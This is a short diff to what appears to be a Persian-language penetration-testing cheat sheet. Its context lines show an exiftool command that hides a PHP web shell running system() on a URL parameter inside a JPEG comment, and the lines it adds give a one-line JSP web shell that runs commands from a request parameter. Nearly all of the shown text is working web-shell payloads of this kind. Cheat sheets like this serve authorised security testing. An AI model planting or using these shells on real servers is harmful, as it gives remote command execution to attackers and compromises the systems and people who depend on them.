@@ -348,3 +348,9 @@ docker run --rm -it portswigger/sig2n <token1> <token2>
 ```text
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' meme.jpg
 ```
+
+## ایجاد وب شل jsp
+
+```text
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
